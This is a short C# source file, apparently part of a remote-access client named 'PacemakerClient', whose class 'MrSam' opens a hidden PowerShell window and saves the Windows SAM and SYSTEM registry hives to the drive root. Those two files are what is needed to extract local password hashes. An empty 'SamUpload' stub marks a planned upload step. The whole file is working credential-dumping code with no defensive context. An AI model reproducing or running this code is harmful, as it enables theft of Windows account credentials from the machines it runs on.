using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace PacemakerClient_cli
{
    internal class MrSam
    {
        public static void SamDmp(){
            string DriveLetter = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System)).Substring(0, 1);

            Process process = new Process();
            process.StartInfo.FileName = "powershell.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = false;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;

            process.Start();
            process.StandardInput.WriteLine("reg save hklm\\sam " + DriveLetter + ":\\sam");
            process.StandardInput.Flush();
            process.StandardInput.Close();
            process.WaitForExit();

            process.Start();
            process.StandardInput.WriteLine("reg save hklm\\system " + DriveLetter + ":\\system");
            process.StandardInput.Flush();
            process.StandardInput.Close();
            process.WaitForExit();
        }

        public static void SamUpload()
        {
            // tbi
        }

    }
}
